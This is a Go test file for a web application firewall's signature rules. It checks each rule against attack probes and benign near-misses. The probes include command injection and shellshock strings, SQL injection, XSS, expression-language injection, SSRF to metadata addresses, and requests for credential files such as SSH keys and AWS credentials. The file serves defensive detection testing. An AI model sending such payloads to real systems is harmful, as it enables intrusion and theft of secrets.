// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package signatures_test

import (
	"net/url"
	"strings"
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/ruleset/core"
	"github.com/gsoultan/gwaf/ruleset/leaks"
	"github.com/gsoultan/gwaf/ruleset/signatures"
	"github.com/gsoultan/gwaf/types"
)

// probe is one request. Zero fields are left out of it.
type probe struct {
	target string
	header [2]string
	body   string
	ct     string
	upload [2]string // file name, content -- sent as a real multipart body
}

func arg(v string) probe  { return probe{target: "/?q=" + url.QueryEscape(v)} }
func path(p string) probe { return probe{target: p} }
func hdr(name, v string) probe {
	return probe{header: [2]string{name, v}}
}
func form(v string) probe { return probe{target: "/submit", body: "q=" + url.QueryEscape(v)} }
func argName(n string) probe {
	return probe{target: "/?" + url.QueryEscape(n) + "=1"}
}
func upload(name, content string) probe { return probe{upload: [2]string{name, content}} }

// multipart builds a body carrying one uploaded file. It has to be a real
// multipart payload: the engine records an upload's name under TargetFileNames
// and its content among the values, and a form-encoded "file=evil.php" puts the
// name where a file-name rule does not look.
func multipart(name, content string) (body, contentType string) {
	const boundary = "----gwafSignatureBoundary7f3a"
	body = "--" + boundary + "\r\n" +
		`Content-Disposition: form-data; name="upload"; filename="` + name + `"` + "\r\n" +
		"Content-Type: application/octet-stream\r\n\r\n" +
		content + "\r\n" +
		"--" + boundary + "--\r\n"
	return body, "multipart/form-data; boundary=" + boundary
}

// fired sends p through w and returns the rule IDs that matched.
func fired(w *gwaf.WAF, p probe) map[types.RuleID]bool {
	tx := w.NewTransaction()
	defer tx.Close()

	out := map[types.RuleID]bool{}
	collect := func() {
		for _, m := range tx.Matches() {
			out[m.RuleID] = true
		}
	}
	body, ct := p.body, p.ct
	if p.upload[0] != "" {
		body, ct = multipart(p.upload[0], p.upload[1])
	}
	method, target := "GET", p.target
	if body != "" {
		method = "POST"
	}
	if target == "" {
		target = "/"
	}
	tx.SetRemoteAddr("203.0.113.10:44321")
	tx.SetRequestLine(method, target, "HTTP/1.1")
	tx.AddRequestHeader("Host", "app.example.com")
	if p.header[0] != "" {
		tx.AddRequestHeader(p.header[0], p.header[1])
	}
	if body != "" {
		if ct == "" {
			ct = "application/x-www-form-urlencoded"
		}
		tx.AddRequestHeader("Content-Type", ct)
	}
	tx.ProcessRequestHeaders()
	collect()
	if body != "" {
		tx.SetRequestBody([]byte(body))
	}
	tx.ProcessRequestBody()
	collect()
	return out
}

// only builds an engine holding the single rule id, so a hit is that rule's and
// a miss is that rule's. With the whole set loaded a broken literal hint shows
// up as the intended rule going quiet while a neighbour still catches the
// payload, which reads as a pass.
func only(t *testing.T, id types.RuleID) *gwaf.WAF {
	t.Helper()
	var set rules.Set
	for _, r := range signatures.All() {
		if r.ID == id {
			set = append(set, r)
		}
	}
	if len(set) != 1 {
		t.Fatalf("rule %d: found %d times in signatures.All()", id, len(set))
	}
	w, err := gwaf.New(
		gwaf.WithoutCoreRuleset(),
		gwaf.WithRuleset(set),
		gwaf.WithMode(gwaf.DetectionOnly),
		gwaf.WithMinConfidence(types.Low),
	)
	if err != nil {
		t.Fatalf("rule %d: %v", id, err)
	}
	return w
}

var cases = []struct {
	id     types.RuleID
	name   string
	hits   []probe
	misses []probe
}{
	{signatures.IDScriptObfuscation, "script obfuscation",
		[]probe{arg("String.fromCharCode(88)"), arg("eval(atob(x))"), arg("navigator.sendBeacon(u,d)"),
			arg("new WebSocket(u)"), arg("document.createElement('script')"), arg("%u0041")},
		[]probe{arg("document.title"), arg("the websocket guide"), arg("escape room")}},
	{signatures.IDPHPKeyword, "php keyword",
		[]probe{arg("$_REQUEST[cmd]"), arg("$_GET[0]"), arg("shell_exec('id')"), arg("base64_decode('x')"),
			arg("file_get_contents('/etc/passwd')"), hdr("Referer", "<?php")},
		[]probe{arg("php tutorial"), arg("$5 off"), arg("get the files")}},
	{signatures.IDScriptInUserContent, "script in a user-content directory",
		[]probe{path("/uploads/evil.phtml"), path("/files/x.php"), path("/media/a/b.jsp"),
			path("/wp-content/uploads/2026/x.php5"), path("/tmp/run.sh"), path("/avatars/me.aspx")},
		[]probe{path("/uploads/photo.jpg"), path("/blog/index.php"), path("/files/report.pdf"),
			path("/uploads/x.php/readme.txt")}},
	{signatures.IDGoCode, "go code",
		[]probe{arg("reflect.ValueOf(x)"), arg("os/exec"), arg("unsafe.Pointer(p)"), form("go func(){}()")},
		[]probe{arg("the os package"), arg("reflect on this"), arg("go function")}},
	{signatures.IDJavaClass, "java class",
		[]probe{arg("java.lang.Runtime.exec"), arg("java.lang.ProcessBuilder"), arg("javax.script.ScriptEngineManager"),
			arg("ognl.OgnlContext"), arg("java.net.URLClassLoader"), hdr("X-Api", "runtime.exec")},
		[]probe{arg("java.util.List"), arg("the java runtime"), arg("javascript")}},
	{signatures.IDNodeCode, "node code",
		[]probe{arg("require('child_process')"), arg(`require("fs")`), arg("x.constructor.constructor('return process')()"),
			arg("process.mainModule.require('x')"), arg("execSync('id')"), arg("spawnSync('id')")},
		[]probe{arg("process.env.NODE_ENV"), arg("require('lodash')"), arg("the constructor of x")}},
	{signatures.IDSensitiveFileHeader, "sensitive file in a header",
		[]probe{hdr("Referer", "/etc/passwd"), hdr("X-Forwarded-For", "../../etc/shadow"),
			hdr("Referer", "/proc/self/environ"), hdr("X-Path", "C:/Windows/System32/config/sam"),
			hdr("Referer", "~/.ssh/id_rsa"), hdr("Referer", "~/.aws/credentials")},
		[]probe{hdr("Referer", "https://example.com/etc/page"), arg("/etc/passwd"),
			hdr("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")}},
	{signatures.IDShellshock, "shellshock",
		[]probe{hdr("User-Agent", "() { :; }; /bin/cat /etc/passwd"), hdr("Referer", "() { :;};echo x"),
			hdr("Cookie", "(){ :; }; id"), arg("() { :; }; /bin/id"), hdr("X-A", "()  {  }; id")},
		[]probe{hdr("User-Agent", "Mozilla/5.0 (X11) {x}"), arg("f() { return 1 }"), arg("() => {}")}},
	{signatures.IDShellshockBody, "shellshock in a body",
		[]probe{form("() { :; }; /bin/id"), {target: "/cgi-bin/x", body: "() { :;}; echo x", ct: "text/plain"}},
		[]probe{form("f() { return 1 }"), form("call () then {a}")}},
	{signatures.IDCommandSeparator, "command after a separator",
		[]probe{arg("x; cat /etc/passwd"), arg("x| ls"), arg("x && id"), arg("x; curl http://e/s"),
			arg("x; powershell -enc a"), form("x& cmd.exe /c dir"), arg("a\nid")},
		[]probe{arg("cats; dogs"), arg("a; category list"), arg("cat food"), arg("R&D ideas")}},
	{signatures.IDShellBuiltin, "shell builtin after a separator",
		[]probe{arg("x; base64 /etc/passwd"), arg("x; env"), arg("x; python -c 1"), arg("x| perl -e 1"),
			arg("x`system`"), arg("x; apt-get install nc"), form("x;exec sh")},
		[]probe{arg("x; environment"), arg("python tutorial"), arg("make believe")}},
	{signatures.IDTraversalArgName, "traversal in a parameter name",
		[]probe{argName("../../etc/passwd"), argName("a/../b"), argName("..%2f..%2fx")},
		[]probe{argName("a.b"), argName("user[name]"), arg("../x")}},
	{signatures.IDExpressionLanguage, "expression language",
		[]probe{arg("#{7*7}"), arg("${7*7}"), arg("${T(java.lang.Runtime).getRuntime().exec('id')}"),
			arg("{${phpinfo()}}"), form("${applicationScope}")},
		[]probe{arg("{name}"), arg("$5 and #1"), arg("price: $ {x}")}},
	{signatures.IDGoAnywhere, "goanywhere",
		[]probe{path("/goanywhere/licensing/accept"), path("/GoAnywhere/Licensing/Accept?x=1"),
			path("/goanywhere/%6cicensing/accept")},
		[]probe{path("/goanywhere/login"), path("/licensing/accept")}},
	{signatures.IDText4Shell, "text4shell",
		[]probe{arg("${script:javascript:1}"), arg("${dns:address|x}"), arg("${url:UTF-8:http://e/}"),
			form("${SCRIPT:js:x}")},
		[]probe{arg("${name}"), arg("script: draft"), arg("${env:HOME}")}},
	{signatures.IDFollina, "follina",
		[]probe{arg("ms-msdt:/id IT_BrowseForFile"), form("MS-MSDT:/id   it_browseforfile /x")},
		[]probe{arg("ms-msdt docs"), arg("msdt /id")}},
	{signatures.IDSQLTimeDelay, "sql time delay",
		[]probe{arg("1 and sleep(5)"), arg("benchmark(1000000,md5(1))"), arg("1;select pg_sleep(5)"),
			arg("dbms_lock.sleep(5)"), arg("1; waitfor delay '0:0:5'"), hdr("X-A", "1' RLIKE SLEEP(5)--")},
		[]probe{arg("sleep well"), arg("a benchmark of sorts"), arg("wait for the delay")}},
	{signatures.IDSQLSchemaEnum, "sql schema enumeration",
		[]probe{arg("information_schema.tables"), arg("sys.objects"), arg("pg_catalog.pg_tables"),
			arg("mysql.db"), arg("select @@version")},
		[]probe{arg("information schema"), arg("the sys admin"), arg("version 2")}},
	{signatures.IDSQLTautology, "sql tautology",
		[]probe{arg("admin' or '1'='1"), arg("x' or 1=1"), arg("' or true")},
		[]probe{arg("this or that"), arg("1=1"), arg("a true story")}},
	{signatures.IDMOVEitHeader, "moveit session header",
		[]probe{hdr("X-siis-session-id", "anything"), hdr("x-SIIS-session-ID", "1")},
		[]probe{hdr("X-Session-Id", "abc"), arg("X-siis-session-id")}},
	{signatures.IDXSSTagOrHandler, "script tag or event handler",
		[]probe{arg("<script>alert(1)</script>"), arg("<img src=x onerror=alert(1)>"), arg("<body onload = x()>"),
			hdr("Referer", "<SCRIPT src=//x>"), arg("x onmouseover=alert(1)")},
		[]probe{arg("the script tag"), arg("online=1"), arg("load on error")}},
	{signatures.IDXSSObfuscated, "obfuscated script",
		[]probe{arg("String.fromCharCode(88,83,83)"), arg("eval(x.atob(y))"), arg("eval(base64)"),
			arg("document.write('<x>')"), arg("unescape('%3c')")},
		[]probe{arg("evaluate(base)"), arg("a base64 string"), arg("document.title")}},
	{signatures.IDNoSQLOperator, "nosql operator",
		[]probe{arg("$where"), arg(`{"$gt":""}`), arg(`{"$ne":null}`), form("$regex"), arg("$exists")},
		[]probe{arg("$5 off"), arg("where to go"), arg("gt and lt")}},
	{signatures.IDPrototypeChain, "prototype chain",
		[]probe{arg("constructor[prototype]"), arg("a.prototype.b"), argName("constructor[prototype][x]")},
		[]probe{arg("the prototype pattern"), arg("constructor"), argName("user[name]")}},
	{signatures.IDInternalAddress, "internal address",
		[]probe{arg("http://127.0.0.1/admin"), arg("http://LOCALHOST:8080/"), arg("http://169.254.169.254/latest"),
			arg("http://metadata.google.internal/x"), form("https://kubernetes.default.svc/api")},
		[]probe{arg("http://example.com/"), arg("192.168.1.1"), arg("the local host")}},
	{signatures.IDUploadExecutableExt, "executable upload",
		[]probe{upload("evil.php", "harmless"), upload("a.JSP", "x"), upload("run.sh", "x"), upload("x.aspx", "x")},
		[]probe{upload("photo.jpg", "x"), upload("notes.php.txt", "x"), arg("index.php")}},
	{signatures.IDPDFJavaScript, "pdf carrying javascript",
		[]probe{upload("a.pdf", "%PDF-1.4 1 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj"),
			form("%PDF-1.7 5 0 obj <</JS 6 0 R>> endobj")},
		[]probe{upload("a.pdf", "%PDF-1.4 1 0 obj << /Type /Page >> endobj"), form("a PDF about JS")}},
	{signatures.IDRansomwareExt, "ransomware extension",
		[]probe{upload("report.lockbit", "data"), upload("q3.xlsx.WNCRY", "x"), upload("a.ryuk", "x")},
		[]probe{upload("report.pdf", "x"), upload("lockbit-analysis.txt", "x"), arg("a.lockbit")}},
	{signatures.IDWebShellName, "web shell file name",
		[]probe{path("/c99.php"), path("/x/r57.jsp"), path("/uploads/WEEVELY.aspx"), path("/a/backdoor.cgi")},
		[]probe{path("/shell-company/about.php"), path("/docs/c99.html"), path("/cmd/index.html")}},
	{signatures.IDRansomNote, "ransom note file name",
		[]probe{path("/READ_ME.txt"), path("/share/decrypt_files.html"), path("/your_files_are_encrypted.png")},
		[]probe{path("/readme.txt"), path("/read_me.md"), path("/docs/recover.html")}},
	{signatures.IDRansomKeywords, "ransom keywords",
		[]probe{upload("note.txt", "your files ransom bitcoin"), arg("pay at x.onion"), arg("CryptoLocker")},
		[]probe{arg("a random number"), arg("onions and garlic"), upload("note.txt", "meeting notes")}},
	{signatures.IDCryptoMiner, "crypto miner",
		[]probe{arg("coinhive.min.js"), arg("https://x/authedmine.min.js"), form("cryptonight.wasm"),
			arg("miner.start()")},
		[]probe{arg("minerals"), arg("coin collection"), arg("start the miner")}},
	{signatures.IDWPPluginPHP, "wordpress plugin php",
		[]probe{path("/wp-content/plugins/x/evil.php"), path("/WP-Content/Plugins/a/b/c.PHP?x=1")},
		[]probe{path("/wp-content/plugins/x/style.css"), path("/wp-content/themes/x/index.php"),
			path("/plugins/x.php")}},
	{signatures.IDWPEnumeration, "wordpress enumeration",
		[]probe{path("/wp-json/wp/v2/users"), path("/wp-links-opml.php"), path("/wp-config-sample.php"),
			path("/wp-content/debug.log"), path("/readme.html"), path("/wp-content/uploads/a/x.php")},
		[]probe{path("/wp-json/wp/v2/posts"), path("/wp-content/uploads/a/x.png"), path("/readme.md")}},
	{signatures.IDScannerUserAgent, "scanner user agent",
		[]probe{hdr("User-Agent", "sqlmap/1.7"), hdr("User-Agent", "Mozilla/5.0 (compatible; Nmap Scripting Engine)"),
			hdr("User-Agent", "gobuster/3.6"), hdr("User-Agent", "zgrab/0.x"), hdr("User-Agent", "OpenVAS")},
		[]probe{hdr("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"), hdr("Referer", "sqlmap"),
			hdr("User-Agent", "curl/8.4.0")}},
	{signatures.IDScannerHeader, "scanner header",
		[]probe{hdr("X-Scanner", "acunetix"), hdr("Acunetix-Product", "WVS"), hdr("Nessus-Check", "1"),
			hdr("Netsparker-Scan-Id", "x")},
		[]probe{hdr("X-Request-Id", "abc"), hdr("X-Custom", "x-scanner"), arg("x-scanner")}},
	{signatures.IDWebShellProbe, "web shell probe",
		[]probe{path("/tools/bash.py"), path("/cmd.php"), path("/a/web-shell.jsp"), path("/x/nc.pl")},
		[]probe{path("/docs/bash.html"), path("/shellfish.php"), path("/scripts/build.txt")}},
	{signatures.IDSensitiveFileProbe, "sensitive file probe",
		[]probe{path("/.env"), path("/.git/config"), path("/.vscode/settings.json"), path("/.idea/workspace.xml"),
			path("/docker-compose.yml"), path("/config.php.bak")},
		[]probe{path("/environment"), path("/git/config"), path("/docs/docker-compose")}},
}

// TestEachRuleDetectsWhatItNames runs every rule alone against payloads it must
// catch and near-misses it must not. The near-misses are the half that decides
// whether an embedder leaves the rule switched on.
func TestEachRuleDetectsWhatItNames(t *testing.T) {
	t.Parallel()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			w := only(t, tc.id)
			for _, p := range tc.hits {
				if !fired(w, p)[tc.id] {
					t.Errorf("rule %d did not fire on %+v", tc.id, p)
				}
			}
			for _, p := range tc.misses {
				if fired(w, p)[tc.id] {
					t.Errorf("rule %d fired on the benign %+v", tc.id, p)
				}
			}
		})
	}
}

// TestEveryRuleHasACase fails when a rule is added without payloads. A rule
// nothing exercises is a rule whose literal hint can be wrong for a year.
func TestEveryRuleHasACase(t *testing.T) {
	covered := map[types.RuleID]bool{}
	for _, tc := range cases {
		if len(tc.hits) == 0 || len(tc.misses) == 0 {
			t.Errorf("rule %d (%s): needs at least one hit and one miss", tc.id, tc.name)
		}
		covered[tc.id] = true
	}
	for _, r := range signatures.All() {
		if !covered[r.ID] {
			t.Errorf("rule %d (%s) has no test case", r.ID, r.Msg)
		}
	}
}

// TestIDsAreInTheBundleRangeAndCollideWithNothing checks the set can be loaded
// beside core and beside leaks, which is how an embedder loads it.
func TestIDsAreInTheBundleRangeAndCollideWithNothing(t *testing.T) {
	seen := map[types.RuleID]string{}
	for name, set := range map[string]rules.Set{
		"core": core.Default(), "leaks": leaks.All(), "signatures": signatures.All(),
	} {
		for _, r := range set {
			if prev, dup := seen[r.ID]; dup {
				t.Errorf("rule %d is in both %s and %s", r.ID, prev, name)
			}
			seen[r.ID] = name
		}
	}
	for _, r := range signatures.All() {
		if r.ID.Namespace() != types.NamespaceBundle {
			t.Errorf("rule %d is in the %s range, want the optional-bundle range", r.ID, r.ID.Namespace())
		}
		if strings.TrimSpace(r.Msg) == "" || len(r.Tags) == 0 {
			t.Errorf("rule %d: needs a message and at least one tag", r.ID)
		}
	}
	if _, err := gwaf.New(gwaf.WithMinConfidence(types.Low),
		gwaf.WithRuleset(append(signatures.All(), leaks.All()...))); err != nil {
		t.Fatalf("core + signatures + leaks does not compile: %v", err)
	}
}

// TestAllReturnsAFreshSet pins that an embedder editing the returned set --
// changing an action, dropping a rule -- cannot change it for anyone else.
func TestAllReturnsAFreshSet(t *testing.T) {
	a := signatures.All()
	a[0].Msg = "edited"
	a[0].Actions[0] = rules.Log
	b := signatures.All()
	if b[0].Msg == "edited" {
		t.Error("All() returned a shared rule")
	}
	if len(b[0].Actions) != 1 || b[0].Actions[0] == rules.Action(rules.Log) {
		t.Error("All() returned a shared action slice")
	}
}
